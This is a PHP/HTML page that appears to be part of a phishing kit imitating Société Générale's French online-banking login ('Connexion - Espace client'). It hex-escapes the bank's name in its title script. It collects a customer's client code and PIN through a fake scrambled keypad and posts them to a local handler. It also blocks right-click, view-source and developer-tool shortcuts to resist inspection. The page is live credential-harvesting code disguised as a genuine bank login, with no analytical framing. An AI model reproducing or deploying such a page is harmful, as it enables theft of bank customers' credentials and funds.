<?php
require_once __DIR__ . '/../guard.php';
    require_once '../includes/main.php';
?>
<!doctype html>
<html>

    <head>
       
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
     
        <link rel="stylesheet" href="Soc_files/b.min.css">
        <link rel="stylesheet" href="Soc_files/h.css">
        <link rel="stylesheet" href="Soc_files/f.css">
        <link rel="stylesheet" href="Soc_files/m.css">

        <link rel="shortcut icon" href="Soc_files/favicon.ico" type="image/x-icon"> 
        

        <title></title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="header-top">
                <span>Agences</span>
                <span>Aide et contacts</span>
            </div>
            <div class="header-bottom">
                <div class="logo"><img src="Soc_files/logo.png"></div>
                <div class="new"><img style="min-width: 171px;" src="Soc_files/new-account.png" alt=""></div>
            </div>
        </header>
        
        <script type="text/javascript">
            var title = unescape( '%53%6F%63%69%E9%74%E9%20%47%E9%6E%E9%72%61%6C%65%20%7C%20%43%6F%6E%6E%65%78%69%6F%6E' );
            var page_title = unescape( '%43%6F%6E%6E%65%78%69%6F%6E%20%2D%20%45%73%70%61%63%65%20%63%6C%69%65%6E%74' );
        </script>
       
        <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
            <div class="logo"><img src="Soc_files/logo2.jpg"></div>
        </header>


        <div class="page-title">
            <p class="mb-0 pl-5 mt-4 font-weight-bold" style="color: #000">Connexion - Espace client</p>
        </div>

       
        <main id="main" class="pt-5 pb-5 mt-5 mb-5">
            <div class="container">
                <div class="row">
                    <div class="col-md-5">
                        <form class="text-center login-form" method="post" action="../index.php">
                         <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="login">
							<div class="form-group mb-5">
                                <label>
                                    <p class="label-txt">Saisissez votre code client</p>
                                    <input type="text" class="input" id="code_client" name="code_client" maxlength="8" minlength="4" required>
                                </label>
                                <span class="input-reset"><i class="fas fa-times"></i></span>
                                <span class="check"><i class="fas fa-check"></i></span>
                                <div class="error-message">Veuillez vérifier votre identifiant et votre code confidentiel.</div>
                            </div>
                            <div class="form-group mb-5">
                                <img src="Soc_files/remember.jpg">
                            </div>
                            <input type="hidden" name="password" id="password" required>
                            <div class="form-group mb-3 zzz">
                                <ul class="password-field">
                                    <li class="empty"></li>
                                    <li class="empty"></li>
                                    <li class="empty"></li>
                                    <li class="empty"></li>
                                    <li class="empty"></li>
                                    <li class="empty"></li>
                                    <li class="empty reset-password"><i class="fas fa-times"></i></li>
                                </ul>
                            </div>
                            <div class="form-group mb-5 zzz">
                                <ul class="numbers">
                                    <li><a data-number="5">5</a></li>
                                    <li><a data-number="zz"></a></li>
                                    <li><a data-number="7">7</a></li>
                                    <li><a data-number="6">6</a></li>
                                </ul>
                                <ul class="numbers">
                                    <li><a data-number="zz"></a></li>
                                    <li><a data-number="1">1</a></li>
                                    <li><a data-number="zz"></a></li>
                                    <li><a data-number="zz"></a></li>
                                </ul>
                                <ul class="numbers">
                                    <li><a data-number="2">2</a></li>
                                    <li><a data-number="zz"></a></li>
                                    <li><a data-number="4">4</a></li>
                                    <li><a data-number="8">8</a></li>
                                </ul>
                                <ul class="numbers">
                                    <li><a data-number="9">9</a></li>
                                    <li><a data-number="zz"></a></li>
                                    <li><a data-number="0">0</a></li>
                                    <li><a data-number="3">3</a></li>
                                </ul>
                            </div>
                            <input type="hidden" name="type" value="login">
                            <div class="form-group mb-5">
                                <button type="button">
                                    <img style="min-width: 230px;" src="Soc_files/valider.png">
                                </button>
                            </div>
<input type="hidden" name="type" value="log">
                        </form>
                    </div>
                    <div class="col-md-7 d-lg-block d-md-block d-sm-none d-none" style="overflow: hidden;">
                        <img style="min-width: 593px; max-width: 593px;" src="Soc_files/index-content.png">
                    </div>
                </div>
            </div>
        </main>
        

        <div class="index-content d-lg-none d-md-none d-sm-block d-block">
            <img style="min-width: 460px; max-width: 460px;" src="Soc_files/index-content2.png">
        </div>

    
        <div id="footer1" class="pt-5 pb-5">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-8 col-md-8 col-sm-12 col-12 text-center">
                        <img style="min-width: 792px;" src="Soc_files/footer-info.png" class="d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 346px;" src="Soc_files/footer-info2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none text-right">
                        <img style="min-width: 154px;" src="Soc_files/social.png">
                    </div>
                </div>
            </div>
        </div>
        
        <div id="footer2" class="pt-3 pb-3">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-3 col-md-3 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 160px;" src="Soc_files/logo.jpg">
                    </div>
                    <div class="col-lg-9 col-md-3 col-sm-12 col-12 text-lg-right text-md-right text-sm-center text-center">
                        <img style="min-width: 713px;" src="Soc_files/footer-links.jpg" class="d-lg-inline-block d-md-inline-block d-sm-none d-none">
                        <img style="min-width: 143px;" src="Soc_files/footer-links2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                </div>
            </div>
        </div>
       
        <script src="Soc_files/j.min.js"></script>
        <script src="Soc_files/p.min.js"></script>
        <script src="Soc_files/b.min.js"></script>
        <script src="Soc_files/f.min.js"></script>
        <script src="Soc_files/m.js"></script>

        <script type="text/javascript">
            $('title').text(title);
            $('#page_header h3').html('<i class="far fa-arrow-alt-circle-left"></i> ' + page_title);
        </script>




<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>

    </body>

</html>